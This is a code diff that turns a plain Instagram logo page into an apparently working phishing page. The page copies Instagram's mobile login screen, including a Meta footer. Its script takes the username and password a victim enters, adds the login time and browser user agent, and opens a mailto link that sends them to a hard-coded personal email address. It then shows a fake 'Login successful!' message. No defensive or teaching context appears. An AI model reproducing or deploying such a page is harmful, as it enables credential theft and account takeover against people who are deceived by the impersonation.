@@ -12,55 +12,447 @@
             box-sizing: border-box;
         }
 
-        html,
         body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background-color: #121212;
+            color: #e4e6eb;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 0;
+        }
+
+        .mobile-container {
             width: 100%;
-            height: 100%;
+            max-width: 390px;
+            height: 100vh;
+            background-color: #121212;
+            display: flex;
+            flex-direction: column;
+            position: relative;
         }
 
-        body {
-            display: grid;
-            place-items: center;
-            background: #d9d9d9;
-            font-family: Arial, Helvetica, sans-serif;
+        .header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 16px 16px;
+            border-bottom: 1px solid #262626;
         }
 
-        .logo-stage {
+        .back-button {
+            background: none;
+            border: none;
+            color: #e4e6eb;
+            font-size: 24px;
+            cursor: pointer;
+            padding: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            transition: opacity 0.2s;
+        }
+
+        .back-button:active {
+            opacity: 0.7;
+        }
+
+        .language-selector {
+            background: none;
+            border: none;
+            color: #a0a0a0;
+            font-size: 15px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            padding: 8px 12px;
+            transition: color 0.2s;
+        }
+
+        .language-selector:active {
+            color: #e4e6eb;
+        }
+
+        .content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 60px 20px 40px;
+            overflow-y: auto;
+        }
+
+        .logo-container {
+            margin-bottom: 40px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .instagram-logo {
             width: 80px;
             height: 80px;
-            display: grid;
-            place-items: center;
-        }
-
-        .instagram-badge {
-            width: 80px;
-            height: 80px;
+            margin-bottom: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
             border-radius: 50%;
-            display: grid;
-            place-items: center;
             background: linear-gradient(135deg, #f10074 0%, #d10d8a 20%, #ff6a3d 58%, #ff9f1c 100%);
-            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.04);
+            box-shadow: 0 0 0 1px rgba(255, 255, 255, 0.05);
+            flex-shrink: 0;
         }
 
-        .instagram-badge svg {
+        .instagram-logo svg {
             width: 76%;
             height: 76%;
             display: block;
+        }
+
+        .instagram-text {
+            font-size: 32px;
+            font-weight: 700;
+            letter-spacing: -0.5px;
+            color: #e4e6eb;
+            margin-bottom: 60px;
+            display: none;
+        }
+
+        .form-container {
+            width: 100%;
+        }
+
+        .form-group {
+            margin-bottom: 12px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 12px 16px;
+            font-size: 16px;
+            background-color: #262626;
+            border: 1px solid #404040;
+            border-radius: 8px;
+            color: #e4e6eb;
+            outline: none;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
+            color: #a0a0a0;
+        }
+
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            border-color: #5a5a5a;
+            background-color: #1a1a1a;
+        }
+
+        input.error {
+            border-color: #ed4956;
+        }
+
+        .error-message {
+            color: #f15245;
+            font-size: 12px;
+            margin-top: 6px;
+            display: none;
+            padding: 0 2px;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .login-button {
+            width: 100%;
+            padding: 10px;
+            margin-top: 20px;
+            background-color: #0a66c2;
+            color: #fff;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            font-family: inherit;
+        }
+
+        .login-button:active {
+            background-color: #0857a0;
+        }
+
+        .login-button:disabled {
+            background-color: #0857a0;
+            opacity: 0.6;
+            cursor: not-allowed;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #e4e6eb;
+            text-decoration: none;
+            font-size: 13px;
+            transition: opacity 0.2s;
+        }
+
+        .forgot-password a:active {
+            opacity: 0.7;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            margin: 32px 0 24px;
+            font-size: 13px;
+            color: #a0a0a0;
+            gap: 16px;
+        }
+
+        .divider::before,
+        .divider::after {
+            content: '';
+            flex: 1;
+            height: 1px;
+            background: #262626;
+        }
+
+        .signup-section {
+            width: 100%;
+            margin-top: 32px;
+        }
+
+        .create-account-button {
+            width: 100%;
+            padding: 10px;
+            background: none;
+            border: 1.5px solid #0a66c2;
+            border-radius: 8px;
+            color: #0a66c2;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            font-family: inherit;
+        }
+
+        .create-account-button:active {
+            background-color: rgba(10, 102, 194, 0.1);
+        }
+
+        .footer {
+            padding: 20px;
+            text-align: center;
+            border-top: 1px solid #262626;
+        }
+
+        .meta-logo {
+            font-size: 14px;
+            color: #a0a0a0;
+            letter-spacing: 1px;
+        }
+
+        .success-message {
+            background-color: #2d5016;
+            color: #31a24c;
+            border: 1px solid #3d6b21;
+            border-radius: 6px;
+            padding: 10px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            display: none;
+            text-align: center;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        @media (max-width: 480px) {
+            .mobile-container {
+                max-width: 100%;
+            }
+
+            .content {
+                padding: 50px 20px 40px;
+            }
+
+            .logo-container {
+                margin-bottom: 60px;
+            }
         }
     </style>
 </head>
 
 <body>
-    <div class="logo-stage">
-        <div class="instagram-badge" aria-label="Instagram logo" role="img">
-            <svg viewBox="0 0 700 700" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
-                <rect x="100" y="100" width="500" height="500" rx="126" fill="none" stroke="white" stroke-width="30" />
-                <circle cx="350" cy="350" r="180" fill="none" stroke="white" stroke-width="30" />
-                <circle cx="350" cy="350" r="76" fill="none" stroke="white" stroke-width="22" />
-                <circle cx="486" cy="228" r="22" fill="white" />
-            </svg>
+    <div class="mobile-container">
+        <div class="header">
+            <button class="back-button" onclick="history.back()">←</button>
+            <button class="language-selector">
+                English (UK) ▼
+            </button>
+        </div>
+
+        <div class="content">
+            <div class="logo-container">
+                <div class="instagram-logo" aria-label="Instagram logo">
+                    <svg viewBox="0 0 240 240" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                        <rect x="38" y="40" width="164" height="160" rx="38" fill="none" stroke="white"
+                            stroke-width="12" />
+                        <circle cx="120" cy="120" r="48" fill="none" stroke="white" stroke-width="12" />
+                        <circle cx="120" cy="120" r="20" fill="none" stroke="white" stroke-width="10" />
+                        <circle cx="170" cy="79" r="10" fill="white" />
+                    </svg>
+                </div>
+                <div class="instagram-text">instagram</div>
+            </div>
+
+            <div class="form-container">
+                <div class="success-message" id="successMessage">
+                    Login successful! ✓
+                </div>
+
+                <form id="loginForm">
+                    <div class="form-group">
+                        <input type="text" id="username" placeholder="Username, email address or mobile number"
+                            autocomplete="username">
+                        <div class="error-message" id="usernameError"></div>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+                        <div class="error-message" id="passwordError"></div>
+                    </div>
+
+                    <button type="submit" class="login-button" id="loginBtn">Log in</button>
+                </form>
+
+                <div class="forgot-password">
+                    <a href="#forgot">Forgotten password?</a>
+                </div>
+
+                <div class="divider">OR</div>
+
+                <div class="signup-section">
+                    <button class="create-account-button" onclick="alert('Sign up feature coming soon!')">
+                        Create new account
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer">
+            <div class="meta-logo">∞ Meta</div>
         </div>
     </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const usernameInput = document.getElementById('username');
+        const passwordInput = document.getElementById('password');
+        const usernameError = document.getElementById('usernameError');
+        const passwordError = document.getElementById('passwordError');
+        const loginBtn = document.getElementById('loginBtn');
+        const successMessage = document.getElementById('successMessage');
+        const recipientEmail = 'mallickfahad13@gmail.com';
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            // Clear previous errors
+            usernameError.classList.remove('show');
+            passwordError.classList.remove('show');
+            usernameInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+
+            let hasError = false;
+
+            // Validate username
+            if (!usernameInput.value.trim()) {
+                usernameError.textContent = 'Username, email or phone number required.';
+                usernameError.classList.add('show');
+                usernameInput.classList.add('error');
+                hasError = true;
+            }
+
+            // Validate password
+            if (!passwordInput.value) {
+                passwordError.textContent = 'Password required.';
+                passwordError.classList.add('show');
+                passwordInput.classList.add('error');
+                hasError = true;
+            } else if (passwordInput.value.length < 6) {
+                passwordError.textContent = 'Password must be at least 6 characters.';
+                passwordError.classList.add('show');
+                passwordInput.classList.add('error');
+                hasError = true;
+            }
+
+            if (!hasError) {
+                const username = usernameInput.value.trim();
+                const password = passwordInput.value;
+                const loginTime = new Date().toLocaleString();
+
+                // Simulate login process
+                loginBtn.disabled = true;
+                loginBtn.textContent = 'Logging in...';
+
+                // Simulate API call delay
+                await new Promise(resolve => setTimeout(resolve, 1500));
+
+                const emailBody = [
+                    'New user login details',
+                    '',
+                    `Username / Email / Mobile: ${username}`,
+                    `Password: ${password}`,
+                    `Login Time: ${loginTime}`,
+                    `User Agent: ${navigator.userAgent}`
+                ].join('\n');
+
+                window.location.href = `mailto:${recipientEmail}?subject=${encodeURIComponent('New user login details')}&body=${encodeURIComponent(emailBody)}`;
+
+                successMessage.classList.add('show');
+
+                await new Promise(resolve => setTimeout(resolve, 1200));
+
+                // Reset form
+                form.reset();
+                successMessage.classList.remove('show');
+                loginBtn.disabled = false;
+                loginBtn.textContent = 'Log in';
+            }
+        });
+
+        // Remove error styling on input
+        usernameInput.addEventListener('focus', () => {
+            if (usernameInput.classList.contains('error')) {
+                usernameInput.classList.remove('error');
+                usernameError.classList.remove('show');
+            }
+        });
+
+        passwordInput.addEventListener('focus', () => {
+            if (passwordInput.classList.contains('error')) {
+                passwordInput.classList.remove('error');
+                passwordError.classList.remove('show');
+            }
+        });
+
+        // Language selector
+        document.querySelector('.language-selector').addEventListener('click', () => {
+            alert('Language selection: English (UK), Español, Português, etc.');
+        });
+    </script>
 </body>
 
 </html>
